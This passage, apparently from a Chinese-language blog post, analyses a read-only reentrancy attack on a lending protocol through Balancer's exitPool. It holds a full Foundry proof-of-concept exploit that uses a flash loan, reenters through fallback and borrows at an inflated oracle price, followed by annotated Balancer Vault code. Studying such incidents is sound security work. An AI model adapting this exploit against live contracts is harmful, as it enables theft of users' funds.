class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.10;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;./../../interface.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface IWeightedBalancerLPOracle &#123;</span><br><span class="line">    function getPrice(address token) external view returns (uint256);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IAccountManager &#123;</span><br><span class="line">    function riskEngine() external;</span><br><span class="line"></span><br><span class="line">    function openAccount(address owner) external returns (address);</span><br><span class="line"></span><br><span class="line">    function borrow(address account, address token, uint256 amt) external;</span><br><span class="line"></span><br><span class="line">    function deposit(address account, address token, uint256 amt) external;</span><br><span class="line"></span><br><span class="line">    function exec(address account, address target, uint256 amt, bytes calldata data) external;</span><br><span class="line"></span><br><span class="line">    function approve(address account, address token, address spender, uint256 amt) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IBalancerToken is IERC20 &#123;</span><br><span class="line">    function getPoolId() external view returns (bytes32);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ContractTest is Test &#123;</span><br><span class="line">    IERC20 WBTC = IERC20(0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f);</span><br><span class="line">    IERC20 WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);</span><br><span class="line">    IERC20 USDC = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);</span><br><span class="line">    IERC20 USDT = IERC20(0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9);</span><br><span class="line">    IERC20 FRAX = IERC20(0x17FC002b466eEc40DaE837Fc4bE5c67993ddBd6F);</span><br><span class="line">    address FRAXBP = 0xC9B8a3FDECB9D5b218d02555a8Baf332E5B740d5;</span><br><span class="line">    address account;</span><br><span class="line">    bytes32 PoolId;</span><br><span class="line">    uint256 nonce;</span><br><span class="line">    IBalancerToken balancerToken = IBalancerToken(0x64541216bAFFFEec8ea535BB71Fbc927831d0595);</span><br><span class="line">    IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);</span><br><span class="line">    IAaveFlashloan aaveV3 = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);</span><br><span class="line">    IAccountManager AccountManager = IAccountManager(0x62c5AA8277E49B3EAd43dC67453ec91DC6826403);</span><br><span class="line">    IWeightedBalancerLPOracle WeightedBalancerLPOracle =</span><br><span class="line">        IWeightedBalancerLPOracle(0x16F3ae9C1727ee38c98417cA08BA785BB7641b5B);</span><br><span class="line">    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        cheats.createSelectFork(&quot;arbitrum&quot;, 77_026_912);</span><br><span class="line">        cheats.label(address(WBTC), &quot;WBTC&quot;);</span><br><span class="line">        cheats.label(address(USDT), &quot;USDT&quot;);</span><br><span class="line">        cheats.label(address(USDC), &quot;USDC&quot;);</span><br><span class="line">        cheats.label(address(WETH), &quot;WETH&quot;);</span><br><span class="line">        cheats.label(address(FRAX), &quot;FRAX&quot;);</span><br><span class="line">        cheats.label(address(account), &quot;account&quot;);</span><br><span class="line">        cheats.label(address(Balancer), &quot;Balancer&quot;);</span><br><span class="line">        cheats.label(address(aaveV3), &quot;aaveV3&quot;);</span><br><span class="line">        cheats.label(address(balancerToken), &quot;balancerToken&quot;);</span><br><span class="line">        cheats.label(address(AccountManager), &quot;AccountManager&quot;);</span><br><span class="line">        cheats.label(address(WeightedBalancerLPOracle), &quot;WeightedBalancerLPOracle&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testExploit() external &#123;</span><br><span class="line">        payable(address(0)).transfer(address(this).balance);</span><br><span class="line">        AccountManager.riskEngine();</span><br><span class="line">        address[] memory assets = new address[](3);</span><br><span class="line">        assets[0] = address(WBTC);</span><br><span class="line">        assets[1] = address(WETH);</span><br><span class="line">        assets[2] = address(USDC);</span><br><span class="line">        uint256[] memory amounts = new uint256[](3);</span><br><span class="line">        amounts[0] = 606 * 1e8;</span><br><span class="line">        amounts[1] = 10_050_100 * 1e15;</span><br><span class="line">        amounts[2] = 18_000_000 * 1e6;</span><br><span class="line"></span><br><span class="line">        //interestRateModes ，0表示不将未还的闪电贷债务转为普通贷款</span><br><span class="line">        uint256[] memory modes = new uint256[](3);</span><br><span class="line">        modes[0] = 0;</span><br><span class="line">        modes[1] = 0;</span><br><span class="line">        modes[2] = 0;</span><br><span class="line">        aaveV3.flashLoan(address(this), assets, amounts, modes, address(this), &quot;&quot;, 0);</span><br><span class="line"></span><br><span class="line">        console.log(&quot;\r&quot;);</span><br><span class="line">        emit log_named_decimal_uint(</span><br><span class="line">            &quot;Attacker USDC balance after exploit&quot;,</span><br><span class="line">            USDC.balanceOf(address(this)),</span><br><span class="line">            USDC.decimals()</span><br><span class="line">        );</span><br><span class="line">        emit log_named_decimal_uint(</span><br><span class="line">            &quot;Attacker USDT balance after exploit&quot;,</span><br><span class="line">            USDT.balanceOf(address(this)),</span><br><span class="line">            USDT.decimals()</span><br><span class="line">        );</span><br><span class="line">        emit log_named_decimal_uint(</span><br><span class="line">            &quot;Attacker WETH balance after exploit&quot;,</span><br><span class="line">            WETH.balanceOf(address(this)),</span><br><span class="line">            WETH.decimals()</span><br><span class="line">        );</span><br><span class="line">        emit log_named_decimal_uint(</span><br><span class="line">            &quot;Attacker WBTC balance after exploit&quot;,</span><br><span class="line">            WBTC.balanceOf(address(this)),</span><br><span class="line">            WBTC.decimals()</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function executeOperation(</span><br><span class="line">        address[] calldata assets,</span><br><span class="line">        uint256[] calldata amounts,</span><br><span class="line">        uint256[] calldata premiums,</span><br><span class="line">        address initiator,</span><br><span class="line">        bytes calldata params</span><br><span class="line">    ) external payable returns (bool) &#123;</span><br><span class="line">        depositCollateral(assets);</span><br><span class="line">        joinPool(assets);</span><br><span class="line">        exitPool();</span><br><span class="line">        WETH.approve(address(aaveV3), type(uint256).max);</span><br><span class="line">        WBTC.approve(address(aaveV3), type(uint256).max);</span><br><span class="line">        USDC.approve(address(aaveV3), type(uint256).max);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function depositCollateral(address[] calldata assets) internal &#123;</span><br><span class="line">        WETH.withdraw(100 * 1e15);</span><br><span class="line">        //创建account用来后续借钱</span><br><span class="line">        account = AccountManager.openAccount(address(this));</span><br><span class="line">        WETH.approve(address(AccountManager), 50 * 1e18);</span><br><span class="line">        AccountManager.deposit(account, address(WETH), 50 * 1e18);</span><br><span class="line">        AccountManager.approve(account, address(WETH), address(Balancer), 50 * 1e18);</span><br><span class="line">        PoolId = balancerToken.getPoolId();</span><br><span class="line">        uint256[] memory amountIn = new uint256[](3);</span><br><span class="line">        amountIn[0] = 0;</span><br><span class="line">        amountIn[1] = 50 * 1e18;</span><br><span class="line">        amountIn[2] = 0;</span><br><span class="line">        bytes memory userDatas = abi.encode(uint256(1), amountIn, uint256(0));</span><br><span class="line">        IBalancerVault.JoinPoolRequest memory joinPoolRequest_1 = IBalancerVault.JoinPoolRequest(&#123;</span><br><span class="line">            asset: assets,</span><br><span class="line">            maxAmountsIn: amountIn,</span><br><span class="line">            userData: userDatas,</span><br><span class="line">            fromInternalBalance: false</span><br><span class="line">        &#125;);</span><br><span class="line">        // &quot;joinPool(bytes32,address,address,(address[],uint256[],bytes,bool))&quot;</span><br><span class="line">        bytes memory execData = abi.encodeWithSelector(0xb95cac28, PoolId, account, account, joinPoolRequest_1);</span><br><span class="line">        //通过 AccountManager 代理，使用 account 账户调用 Balancer 的 joinPool 函数，将这 50 WETH 存入池子中，换取 LP Token</span><br><span class="line">        AccountManager.exec(account, address(Balancer), 0, execData); // deposit 50 WETH</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function joinPool(address[] calldata assets) internal &#123;</span><br><span class="line">        WETH.approve(address(Balancer), 10_000 * 1e18);</span><br><span class="line">        WBTC.approve(address(Balancer), 606 * 1e8);</span><br><span class="line">        USDC.approve(address(Balancer), 18_000_000 * 1e6);</span><br><span class="line">        uint256[] memory amountIn = new uint256[](3);</span><br><span class="line">        amountIn[0] = 606 * 1e8;</span><br><span class="line">        amountIn[1] = 10_000 * 1e18;</span><br><span class="line">        amountIn[2] = 18_000_000 * 1e6;</span><br><span class="line">        bytes memory userDatas = abi.encode(uint256(1), amountIn, uint256(0));</span><br><span class="line">        IBalancerVault.JoinPoolRequest memory joinPoolRequest_2 = IBalancerVault.JoinPoolRequest(&#123;</span><br><span class="line">            asset: assets,</span><br><span class="line">            maxAmountsIn: amountIn,</span><br><span class="line">            userData: userDatas,</span><br><span class="line">            fromInternalBalance: false</span><br><span class="line">        &#125;);</span><br><span class="line">        Balancer.joinPool(PoolId, address(this), address(this), joinPoolRequest_2);</span><br><span class="line">        //Balancer.joinPool&#123;value: 0.1 ether&#125;(PoolId, address(this), address(this), joinPoolRequest_2);</span><br><span class="line">        //joinPool处理剩余的0.1eth也会走call，触发fallback</span><br><span class="line">        console.log(</span><br><span class="line">            &quot;Before Read-Only-Reentrancy Collateral Price \t&quot;,</span><br><span class="line">            WeightedBalancerLPOracle.getPrice(address(balancerToken))</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function exitPool() internal &#123;</span><br><span class="line">        //重制授权</span><br><span class="line">        balancerToken.approve(address(Balancer), 0);</span><br><span class="line"></span><br><span class="line">        address[] memory assetsOut = new address[](3);</span><br><span class="line">        assetsOut[0] = address(WBTC);</span><br><span class="line">        assetsOut[1] = address(0);   // exit的时候走eth，这样可以走call，触发fallback</span><br><span class="line">        assetsOut[2] = address(USDC);</span><br><span class="line">        uint256[] memory amountOut = new uint256[](3);</span><br><span class="line">        amountOut[0] = 606 * 1e8;</span><br><span class="line">        amountOut[1] = 5000 * 1e18;</span><br><span class="line">        amountOut[2] = 9_000_000 * 1e6;</span><br><span class="line">        uint256 balancerTokenAmount = balancerToken.balanceOf(address(this));</span><br><span class="line">        bytes memory userDatas = abi.encode(uint256(1), balancerTokenAmount);</span><br><span class="line">        IBalancerVault.ExitPoolRequest memory exitPoolRequest = IBalancerVault.ExitPoolRequest(&#123;</span><br><span class="line">            asset: assetsOut,</span><br><span class="line">            minAmountsOut: amountOut,</span><br><span class="line">            userData: userDatas,</span><br><span class="line">            toInternalBalance: false</span><br><span class="line">        &#125;);</span><br><span class="line">        Balancer.exitPool(PoolId, address(this), payable(address(this)), exitPoolRequest); //进入fallback</span><br><span class="line">        console.log(</span><br><span class="line">            &quot;After Read-Only-Reentrancy Collateral Price \t&quot;,</span><br><span class="line">            WeightedBalancerLPOracle.getPrice(address(balancerToken))</span><br><span class="line">        );</span><br><span class="line">        //自动wrap回WETH</span><br><span class="line">        address(WETH).call&#123;value: address(this).balance&#125;(&quot;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external payable &#123;</span><br><span class="line">        console.log(&quot;Fallback hit, nonce =&quot;, nonce);</span><br><span class="line">        if (nonce == 2) &#123;</span><br><span class="line">            console.log(</span><br><span class="line">                &quot;In Read-Only-Reentrancy Collateral Price \t&quot;,</span><br><span class="line">                WeightedBalancerLPOracle.getPrice(address(balancerToken))</span><br><span class="line">            );</span><br><span class="line">            borrowAll();</span><br><span class="line">        &#125;</span><br><span class="line">        nonce++;</span><br><span class="line">        console.log(&quot;after ++, nonce =&quot;, nonce);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function borrowAll() internal &#123;</span><br><span class="line">        //借钱触发预言机读取中间态价格</span><br><span class="line">        AccountManager.borrow(account, address(USDC), 461_000 * 1e6);</span><br><span class="line">        AccountManager.borrow(account, address(USDT), 361_000 * 1e6);</span><br><span class="line">        AccountManager.borrow(account, address(WETH), 81 * 1e18);</span><br><span class="line">        AccountManager.borrow(account, address(FRAX), 125_000 * 1e18);</span><br><span class="line">        AccountManager.approve(account, address(FRAX), FRAXBP, type(uint256).max);</span><br><span class="line">        //换掉frax</span><br><span class="line">        bytes memory execData = abi.encodeWithSignature(</span><br><span class="line">            &quot;exchange(int128,int128,uint256,uint256)&quot;,</span><br><span class="line">            0,</span><br><span class="line">            1,</span><br><span class="line">            120_000 * 1e18,</span><br><span class="line">            1</span><br><span class="line">        );</span><br><span class="line">        AccountManager.exec(account, FRAXBP, 0, execData);</span><br><span class="line">        AccountManager.approve(account, address(USDC), address(aaveV3), type(uint256).max);</span><br><span class="line">        AccountManager.approve(account, address(USDT), address(aaveV3), type(uint256).max);</span><br><span class="line">        AccountManager.approve(account, address(WETH), address(aaveV3), type(uint256).max);</span><br><span class="line">        //借款转到aave</span><br><span class="line">        execData = abi.encodeWithSignature(</span><br><span class="line">            &quot;supply(address,uint256,address,uint16)&quot;,</span><br><span class="line">            address(USDC),</span><br><span class="line">            580_000 * 1e6,</span><br><span class="line">            account,</span><br><span class="line">            0</span><br><span class="line">        );</span><br><span class="line">        AccountManager.exec(account, address(aaveV3), 0, execData);</span><br><span class="line">        execData = abi.encodeWithSignature(</span><br><span class="line">            &quot;supply(address,uint256,address,uint16)&quot;,</span><br><span class="line">            address(USDT),</span><br><span class="line">            360_000 * 1e6,</span><br><span class="line">            account,</span><br><span class="line">            0</span><br><span class="line">        );</span><br><span class="line">        AccountManager.exec(account, address(aaveV3), 0, execData);</span><br><span class="line">        execData = abi.encodeWithSignature(</span><br><span class="line">            &quot;supply(address,uint256,address,uint16)&quot;,</span><br><span class="line">            address(WETH),</span><br><span class="line">            80 * 1e18,</span><br><span class="line">            account,</span><br><span class="line">            0</span><br><span class="line">        );</span><br><span class="line">        AccountManager.exec(account, address(aaveV3), 0, execData);</span><br><span class="line"></span><br><span class="line">        //取钱</span><br><span class="line">        execData = abi.encodeWithSignature(</span><br><span class="line">            &quot;withdraw(address,uint256,address)&quot;,</span><br><span class="line">            address(USDC),</span><br><span class="line">            type(uint256).max,</span><br><span class="line">            address(this)</span><br><span class="line">        );</span><br><span class="line">        AccountManager.exec(account, address(aaveV3), 0, execData);</span><br><span class="line">        execData = abi.encodeWithSignature(</span><br><span class="line">            &quot;withdraw(address,uint256,address)&quot;,</span><br><span class="line">            address(USDT),</span><br><span class="line">            type(uint256).max,</span><br><span class="line">            address(this)</span><br><span class="line">        );</span><br><span class="line">        AccountManager.exec(account, address(aaveV3), 0, execData);</span><br><span class="line">        execData = abi.encodeWithSignature(</span><br><span class="line">            &quot;withdraw(address,uint256,address)&quot;,</span><br><span class="line">            address(WETH),</span><br><span class="line">            type(uint256).max,</span><br><span class="line">            address(this)</span><br><span class="line">        );</span><br><span class="line">        AccountManager.exec(account, address(aaveV3), 0, execData);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+
+<h3 id="攻击链上调用分析"><a href="#攻击链上调用分析" class="headerlink" title="攻击链上调用分析"></a>攻击链上调用分析</h3><p>深入分析Balancer Vault中的关键调用链，理解重入是如何被触发的：</p>
+<h3 id="1-exitPool入口函数"><a href="#1-exitPool入口函数" class="headerlink" title="1. exitPool入口函数"></a>1. exitPool入口函数</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function exitPool(</span><br><span class="line">    bytes32 poolId,</span><br><span class="line">    address sender,</span><br><span class="line">    address payable recipient,</span><br><span class="line">    ExitPoolRequest memory request</span><br><span class="line">) external override &#123;</span><br><span class="line">    // 注意：此函数没有nonReentrant修饰符，保护在_joinOrExit中实现</span><br><span class="line">    _joinOrExit(PoolBalanceChangeKind.EXIT, poolId, sender, recipient, _toPoolBalanceChange(request));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="2-核心处理逻辑"><a href="#2-核心处理逻辑" class="headerlink" title="2. 核心处理逻辑"></a>2. 核心处理逻辑</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">function _joinOrExit(</span><br><span class="line">    PoolBalanceChangeKind kind,</span><br><span class="line">    bytes32 poolId,</span><br><span class="line">    address sender,</span><br><span class="line">    address payable recipient,</span><br><span class="line">    PoolBalanceChange memory change</span><br><span class="line">) private nonReentrant withRegisteredPool(poolId) authenticateFor(sender) &#123;</span><br><span class="line">    // 验证代币和获取余额</span><br><span class="line">    IERC20[] memory tokens = _translateToIERC20(change.assets);</span><br><span class="line">    bytes32[] memory balances = _validateTokensAndGetBalances(poolId, tokens);</span><br><span class="line"></span><br><span class="line">    // 关键：调用池的balance change处理，这里会发送代币给攻击合约</span><br><span class="line">    (</span><br><span class="line">        bytes32[] memory finalBalances,</span><br><span class="line">        uint256[] memory amountsInOrOut,</span><br><span class="line">        uint256[] memory paidProtocolSwapFeeAmounts</span><br><span class="line">    ) = _callPoolBalanceChange(kind, poolId, sender, recipient, change, balances);</span><br><span class="line"></span><br><span class="line">    // 重要：余额更新在代币转移之后！</span><br><span class="line">    // 这就是中间状态存在的原因</span><br><span class="line">    PoolSpecialization specialization = _getPoolSpecialization(poolId);</span><br><span class="line">    if (specialization == PoolSpecialization.TWO_TOKEN) &#123;</span><br><span class="line">        _setTwoTokenPoolCashBalances(poolId, tokens[0], finalBalances[0], tokens[1], finalBalances[1]);</span><br><span class="line">    &#125; else if (specialization == PoolSpecialization.MINIMAL_SWAP_INFO) &#123;</span><br><span class="line">        _setMinimalSwapInfoPoolBalances(poolId, tokens, finalBalances);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        _setGeneralPoolBalances(poolId, finalBalances);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="3-代币转移处理"><a href="#3-代币转移处理" class="headerlink" title="3. 代币转移处理"></a>3. 代币转移处理</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">function _callPoolBalanceChange(</span><br><span class="line">    PoolBalanceChangeKind kind,</span><br><span class="line">    bytes32 poolId,</span><br><span class="line">    address sender,</span><br><span class="line">    address payable recipient,</span><br><span class="line">    PoolBalanceChange memory change,</span><br><span class="line">    bytes32[] memory balances</span><br><span class="line">) private returns (</span><br><span class="line">    bytes32[] memory finalBalances,</span><br><span class="line">    uint256[] memory amountsInOrOut,</span><br><span class="line">    uint256[] memory dueProtocolFeeAmounts</span><br><span class="line">) &#123;</span><br><span class="line">    // 调用池的onExitPool钩子函数</span><br><span class="line">    IBasePool pool = IBasePool(_getPoolAddress(poolId));</span><br><span class="line">    (amountsInOrOut, dueProtocolFeeAmounts) = pool.onExitPool(</span><br><span class="line">        poolId, sender, recipient, totalBalances, lastChangeBlock,</span><br><span class="line">        _getProtocolSwapFeePercentage(), change.userData</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    // 计算转账后的fininalBalance，但还没更新到状态变量，此处也处理exitPool的代币转移</span><br><span class="line">    finalBalances = _processExitPoolTransfers(recipient, change, balances, amountsInOrOut, dueProtocolFeeAmounts);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="4-池的退出处理逻辑"><a href="#4-池的退出处理逻辑" class="headerlink" title="4. 池的退出处理逻辑"></a>4. 池的退出处理逻辑</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">function onExitPool(</span><br><span class="line">    bytes32 poolId,</span><br><span class="line">    address sender,</span><br><span class="line">    address recipient,</span><br><span class="line">    uint256[] memory balances,</span><br><span class="line">    uint256 lastChangeBlock,</span><br><span class="line">    uint256 protocolSwapFeePercentage,</span><br><span class="line">    bytes memory userData</span><br><span class="line">) external override onlyVault(poolId) returns (uint256[] memory, uint256[] memory) &#123;</span><br><span class="line">    uint256[] memory amountsOut;</span><br><span class="line">    uint256 bptAmountIn;</span><br><span class="line"></span><br><span class="line">    // 检查是否为恢复模式退出</span><br><span class="line">    if (userData.isRecoveryModeExitKind()) &#123;</span><br><span class="line">        _ensureInRecoveryMode();</span><br><span class="line">        (bptAmountIn, amountsOut) = _doRecoveryModeExit(balances, totalSupply(), userData);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        _beforeSwapJoinExit();</span><br><span class="line"></span><br><span class="line">        uint256[] memory scalingFactors = _scalingFactors();</span><br><span class="line">        _upscaleArray(balances, scalingFactors);</span><br><span class="line"></span><br><span class="line">        // 处理正常的退出逻辑</span><br><span class="line">        (bptAmountIn, amountsOut) = _onExitPool(</span><br><span class="line">            poolId,</span><br><span class="line">            sender,</span><br><span class="line">            recipient,</span><br><span class="line">            balances,</span><br><span class="line">            lastChangeBlock,</span><br><span class="line">            inRecoveryMode() ? 0 : protocolSwapFeePercentage,</span><br><span class="line">            scalingFactors,</span><br><span class="line">            userData</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        _downscaleDownArray(amountsOut, scalingFactors);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 关键：此处销毁LP token，发生在代币实际转移给用户之前</span><br><span class="line">    _burnPoolTokens(sender, bptAmountIn);</span><br><span class="line"></span><br><span class="line">    // 返回要转移的代币数量</span><br><span class="line">    return (amountsOut, new uint256[](balances.length));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="5-退出代币转移逻辑"><a href="#5-退出代币转移逻辑" class="headerlink" title="5. 退出代币转移逻辑"></a>5. 退出代币转移逻辑</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">function _processExitPoolTransfers(</span><br><span class="line">    address payable recipient,</span><br><span class="line">    PoolBalanceChange memory change,</span><br><span class="line">    bytes32[] memory balances,</span><br><span class="line">    uint256[] memory amountsOut,</span><br><span class="line">    uint256[] memory dueProtocolFeeAmounts</span><br><span class="line">) private returns (bytes32[] memory finalBalances) &#123;</span><br><span class="line">    finalBalances = new bytes32[](balances.length);</span><br><span class="line">    for (uint256 i = 0; i &lt; change.assets.length; ++i) &#123;</span><br><span class="line">        uint256 amountOut = amountsOut[i];</span><br><span class="line">        _require(amountOut &gt;= change.limits[i], Errors.EXIT_BELOW_MIN);</span><br><span class="line"></span><br><span class="line">        // 发送代币给接收者 - 关键的重入触发点</span><br><span class="line">        IAsset asset = change.assets[i];</span><br><span class="line">        _sendAsset(asset, amountOut, recipient, change.useInternalBalance);</span><br><span class="line"></span><br><span class="line">        uint256 feeAmount = dueProtocolFeeAmounts[i];</span><br><span class="line">        _payFeeAmount(_translateToIERC20(asset), feeAmount);</span><br><span class="line"></span><br><span class="line">        // 计算新的池余额（在代币发送之后）</span><br><span class="line">        finalBalances[i] = balances[i].decreaseCash(amountOut.add(feeAmount));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="6-ETH发送与重入触发"><a href="#6-ETH发送与重入触发" class="headerlink" title="6. ETH发送与重入触发"></a>6. ETH发送与重入触发</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">function _sendAsset(</span><br><span class="line">    IAsset asset,</span><br><span class="line">    uint256 amount,</span><br><span class="line">    address payable recipient,</span><br><span class="line">    bool toInternalBalance</span><br><span class="line">) internal &#123;</span><br><span class="line">    if (amount == 0) return;</span><br><span class="line"></span><br><span class="line">    if (_isETH(asset)) &#123;</span><br><span class="line">        _require(!toInternalBalance, Errors.INVALID_ETH_INTERNAL_BALANCE);</span><br><span class="line"></span><br><span class="line">        // 首先从WETH合约提取ETH</span><br><span class="line">        _WETH().withdraw(amount);</span><br><span class="line"></span><br><span class="line">        // 然后将提取的ETH发送给接收者 - 重入触发点</span><br><span class="line">        recipient.sendValue(amount);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        IERC20 token = _asIERC20(asset);</span><br><span class="line">        if (toInternalBalance) &#123;</span><br><span class="line">            _increaseInternalBalance(recipient, token, amount);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            token.safeTransfer(recipient, amount);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
